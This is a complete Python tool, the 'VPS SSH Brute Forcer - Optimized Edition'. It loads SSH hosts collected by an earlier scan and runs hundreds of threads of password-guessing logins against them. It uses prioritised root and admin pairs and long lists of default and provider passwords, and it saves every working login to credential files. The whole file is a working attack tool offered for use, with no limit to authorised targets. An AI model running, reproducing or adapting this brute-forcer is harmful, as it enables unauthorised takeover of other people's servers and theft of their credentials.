#!/usr/bin/env python3
"""
VPS SSH BRUTE FORCER - OPTIMIZED EDITION
Prioritizes common credentials and SSH ports
Author: Security Research
"""

import socket
import threading
import paramiko
import sys
import time
import queue
import random
from datetime import datetime

class VPSSSHScanner:
    def __init__(self, threads=200, timeout=3):
        self.threads = threads
        self.timeout = timeout
        self.scan_queue = queue.Queue()
        self.brute_queue = queue.Queue()
        self.open_ssh = []
        self.found_creds = []
        self.lock = threading.Lock()
        self.scanning = True
        self.brute_running = True
        self.total_scanned = 0
        self.start_time = None
        self.total_targets = 0
        self.discovered_ips = []
        
        # Prioritized SSH ports (try common ones first)
        self.ssh_ports = [22, 2222, 22222, 2022, 2200, 443, 4443]
        
        # ===== OPTIMIZED USERNAME LIST (most common first) =====
        self.usernames = [
            'root', 'admin', 'ubuntu', 'centos', 'debian',
            'user', 'oracle', 'ec2-user', 'azureuser', 'pi',
            'vagrant', 'test', 'guest', 'ftp', 'mysql',
            'postgres', 'git', 'docker', 'kali', 'backup',
            'support', 'administrator',
        ]
        
        # ===== OPTIMIZED PASSWORD LIST (most likely first) =====
        self.passwords = [
            # Empty and default
            '', ' ', 'null', 'none', 'root', 'admin', 'password',
            '123456', '12345678', '12345', '1234', '123', '12', '1',
            
            # Common VPS passwords
            'root', 'toor', 'root123', 'rootpass', 'rootpassword',
            'admin', 'admin123', 'adminpass', 'adminpassword',
            'ubuntu', 'centos', 'debian', 'fedora', 'redhat',
            'password123', 'passw0rd', 'P@ssw0rd', 'Password1',
            
            # Provider defaults
            'digitalocean', 'linode', 'vultr', 'aws', 'azure',
            'google', 'hetzner', 'ovh', 'rackspace',
            
            # Service defaults
            'mysql', 'postgres', 'mongodb', 'redis', 'elastic',
            'docker', 'kubernetes', 'nginx', 'apache', 'tomcat',
            'jenkins', 'gitlab', 'wordpress', 'phpmyadmin',
            
            # Common combinations
            'root@123', 'admin@123', 'user@123', 'pass@123',
            'root#123', 'admin#123', 'user#123', 'pass#123',
            'root$123', 'admin$123', 'user$123', 'pass$123',
            
            # Numbers
            '0', '1', '12', '123', '1234', '12345', '123456',
            '111111', '222222', '333333', '444444', '555555',
            '666666', '777777', '888888', '999999',
            '000000', '123123', '321321', '456456',
            
            # Years
            '2020', '2021', '2022', '2023', '2024', '2025', '2026',
            '2000', '2001', '2002', '2003', '2004', '2005',
            
            # Keyboard patterns
            'qwerty', 'asdfgh', 'zxcvbn', 'qwerty123', 'asdfgh123',
            '1qaz2wsx', 'q1w2e3r4', '1q2w3e4r', 'zaq1xsw2',
            
            # Common words
            'password', 'passwd', 'pass', 'pwd', 'secret',
            'letmein', 'welcome', 'hello', 'access', 'admin',
            'manager', 'server', 'vps', 'cloud', 'host',
            'backup', 'backups', 'ftp', 'sftp', 'ssh',
            
            # Names
            'alex', 'andrew', 'ashley', 'ben', 'bob', 'charlie',
            'daniel', 'david', 'edward', 'frank', 'george',
            'harry', 'ian', 'jack', 'kevin', 'larry', 'mike',
            'nick', 'oliver', 'paul', 'quentin', 'robert',
            'sam', 'tom', 'ursula', 'victor', 'william',
            'xavier', 'yves', 'zack',
            
            # More defaults
            'changeme', 'default', 'guest', 'test', 'temp',
            'temporary', 'newuser', 'user1', 'admin1', 'root1',
        ]
        
        self.print_banner()
    
    def print_banner(self):
        print("""\033[91m
╔═══════════════════════════════════════════════════════════════════════╗
║           VPS SSH BRUTE FORCER - OPTIMIZED EDITION                  ║
║                                                                       ║
║   Found 71 SSH hosts - Now trying optimized credential list!         ║
║   Prioritizing: SSH ports (22,2222) > Common usernames > Top passes ║
╚═══════════════════════════════════════════════════════════════════════╝\033[0m""")
    
    def load_targets(self, filename='ssh_open.txt'):
        """Load previously discovered SSH hosts"""
        try:
            with open(filename, 'r') as f:
                for line in f:
                    if ':' in line and '|' in line:
                        parts = line.split('|')
                        ip_port = parts[0].strip()
                        banner = parts[1].strip() if len(parts) > 1 else 'Unknown'
                        
                        if ':' in ip_port:
                            ip, port = ip_port.split(':')
                            port = int(port)
                            
                            self.open_ssh.append({
                                'ip': ip,
                                'port': port,
                                'banner': banner
                            })
                            
                            self.brute_queue.put({
                                'ip': ip,
                                'port': port,
                                'banner': banner
                            })
            
            print(f"\033[92m[+] Loaded {len(self.open_ssh)} SSH hosts from {filename}\033[0m")
            return True
        except:
            return False
    
    def ssh_connect(self, ip, port, username, password):
        """Attempt SSH connection"""
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            client.connect(
                ip,
                port=port,
                username=username,
                password=password,
                timeout=self.timeout,
                allow_agent=False,
                look_for_keys=False,
                banner_timeout=self.timeout,
                auth_timeout=self.timeout
            )
            
            client.close()
            return True
            
        except paramiko.AuthenticationException:
            return False
        except Exception:
            return False
    
    def brute_worker(self):
        """Worker thread for brute forcing"""
        stats = {'attempts': 0, 'start_time': time.time()}
        
        while self.brute_running:
            try:
                target = self.brute_queue.get(timeout=1)
                ip = target['ip']
                port = target['port']
                banner = target.get('banner', 'Unknown')
                
                # Skip non-SSH ports if they're unlikely (but keep trying)
                if port not in [22, 2222, 22222] and 'SSH' not in banner:
                    print(f"\n\033[90m[ ] Skipping {ip}:{port} - unlikely SSH\033[0m")
                    self.brute_queue.task_done()
                    continue
                
                print(f"\n\033[95m⚡ ATTACKING: {ip}:{port} [{banner[:30]}]\033[0m")
                
                total_attempts = len(self.usernames) * len(self.passwords)
                attempts = 0
                found = False
                
                # Try most likely combinations first
                priority_combos = [
                    ('root', ''), ('root', 'root'), ('root', 'password'),
                    ('root', '123456'), ('root', 'toor'), ('root', 'root123'),
                    ('admin', ''), ('admin', 'admin'), ('admin', 'password'),
                    ('admin', '123456'), ('admin', 'admin123'),
                    ('ubuntu', 'ubuntu'), ('centos', 'centos'),
                    ('user', 'user'), ('test', 'test'),
                ]
                
                for username, password in priority_combos:
                    if self.ssh_connect(ip, port, username, password):
                        self.handle_success(ip, port, username, password, banner)
                        found = True
                        break
                    attempts += 1
                
                if not found:
                    # Try all combinations
                    for username in self.usernames:
                        if found or not self.brute_running:
                            break
                        
                        for password in self.passwords:
                            if found or not self.brute_running:
                                break
                            
                            attempts += 1
                            
                            # Show progress every 50 attempts
                            if attempts % 50 == 0:
                                elapsed = time.time() - stats['start_time']
                                rate = attempts / elapsed if elapsed > 0 else 0
                                percent = (attempts / total_attempts) * 100
                                print(f"\033[90m    {ip}:{port} - Progress: {attempts}/{total_attempts} ({percent:.1f}%) | {rate:.1f}/s | Trying: {username}:{password}\033[0m", end='\r')
                            
                            if self.ssh_connect(ip, port, username, password):
                                self.handle_success(ip, port, username, password, banner)
                                found = True
                                break
                
                if not found:
                    print(f"\n\033[91m[-] Failed: {ip}:{port} - No credentials after {attempts} attempts\033[0m")
                
                self.brute_queue.task_done()
                
            except queue.Empty:
                time.sleep(2)
                continue
            except Exception as e:
                continue
    
    def handle_success(self, ip, port, username, password, banner):
        """Handle successful login"""
        result = f"\n\033[92m[🔥] SUCCESS! {ip}:{port} - {username}:{password}\033[0m"
        print(result)
        
        with self.lock:
            self.found_creds.append({
                'ip': ip,
                'port': port,
                'username': username,
                'password': password,
                'banner': banner
            })
        
        # Save immediately
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        with open('ssh_found.txt', 'a') as f:
            f.write(f"[{timestamp}] {ip}:{port} - {username}:{password}\n")
        
        # Also save to a clean format
        with open('ssh_creds.txt', 'a') as f:
            f.write(f"{ip}:{port} | {username}:{password}\n")
    
    def print_status(self):
        """Print current status"""
        while self.brute_running:
            time.sleep(10)
            elapsed = time.time() - self.start_time if self.start_time else 0
            remaining = self.brute_queue.qsize()
            completed = len(self.open_ssh) - remaining
            
            print(f"\n\033[96m{'='*60}\033[0m")
            print(f"⏱️  Elapsed: {elapsed:.0f}s | Completed: {completed}/{len(self.open_ssh)} | Found: {len(self.found_creds)}")
            if self.found_creds:
                print(f"🔥 Last success: {self.found_creds[-1]['ip']}:{self.found_creds[-1]['port']} - {self.found_creds[-1]['username']}:{self.found_creds[-1]['password']}")
            print(f"\033[96m{'='*60}\033[0m")
    
    def run(self):
        """Main execution"""
        self.start_time = time.time()
        
        print(f"\n\033[96m{'='*60}\033[0m")
        print(f"\033[96m🔥 LOADING 71 SSH HOSTS FROM PREVIOUS SCAN\033[0m")
        print(f"\033[96m{'='*60}\033[0m")
        
        # Load previously discovered hosts
        if not self.load_targets():
            print("\033[91m[-] Could not load ssh_open.txt. Please run scan first.\033[0m")
            return
        
        print(f"\n\033[96m{'='*60}\033[0m")
        print(f"\033[96m🔥 PHASE 2: OPTIMIZED BRUTE FORCE\033[0m")
        print(f"\033[96m{'='*60}\033[0m")
        print(f"SSH Targets: {len(self.open_ssh)}")
        print(f"Usernames: {len(self.usernames)} (prioritized)")
        print(f"Passwords: {len(self.passwords)} (optimized)")
        print(f"Priority combos: 10 (tried first)")
        total_attempts = len(self.open_ssh) * len(self.usernames) * len(self.passwords)
        print(f"Total attempts: {total_attempts:,}")
        print(f"Threads: {self.threads}")
        print(f"\033[96m{'='*60}\033[0m\n")
        
        # Ask to proceed
        proceed = input(f"\033[93m[?] Start optimized brute force? (y/n): \033[0m").lower()
        if proceed != 'y':
            print(f"\033[91m[-] Exiting\033[0m")
            return
        
        # Start status thread
        status_thread = threading.Thread(target=self.print_status, daemon=True)
        status_thread.start()
        
        # Start brute threads
        brute_threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self.brute_worker)
            t.daemon = True
            t.start()
            brute_threads.append(t)
        
        # Wait for completion
        try:
            while not self.brute_queue.empty():
                time.sleep(1)
        except KeyboardInterrupt:
            print(f"\n\033[93m[!] Brute force interrupted\033[0m")
            self.brute_running = False
        
        self.brute_running = False
        
        # Final results
        print(f"\n\033[96m{'='*60}\033[0m")
        print(f"\033[96m📊 FINAL RESULTS\033[0m")
        print(f"\033[96m{'='*60}\033[0m")
        
        if self.found_creds:
            print(f"\n\033[92m[🔥] CREDENTIALS FOUND: {len(self.found_creds)}\033[0m")
            print(f"\033[96m{'-'*60}\033[0m")
            for i, cred in enumerate(self.found_creds, 1):
                print(f"{i:2}. {cred['ip']:15}:{cred['port']:<5} | {cred['username']}:{cred['password']}")
        else:
            print(f"\n\033[91m[-] No credentials found\033[0m")
        
        print(f"\n\033[92m[+] Results saved to:\033[0m")
        print(f"    - ssh_creds.txt (clean format)")
        print(f"    - ssh_found.txt (with timestamps)")
        print(f"\033[96m{'='*60}\033[0m")

def main():
    """Main function"""
    
    # Check for paramiko
    try:
        import paramiko
    except ImportError:
        print("\033[91m[-] Paramiko not installed. Install with: pip install paramiko\033[0m")
        sys.exit(1)
    
    # Parse arguments
    import argparse
    parser = argparse.ArgumentParser(description='VPS SSH Brute Forcer - Optimized')
    parser.add_argument('-t', '--threads', type=int, default=200, help='Number of threads')
    parser.add_argument('--timeout', type=int, default=3, help='Connection timeout')
    
    args = parser.parse_args()
    
    # Create and run brute forcer
    brute = VPSSSHScanner(threads=args.threads, timeout=args.timeout)
    
    try:
        brute.run()
    except KeyboardInterrupt:
        print(f"\n\033[93m[!] Program interrupted\033[0m")
        sys.exit(0)

if __name__ == "__main__":
    main()
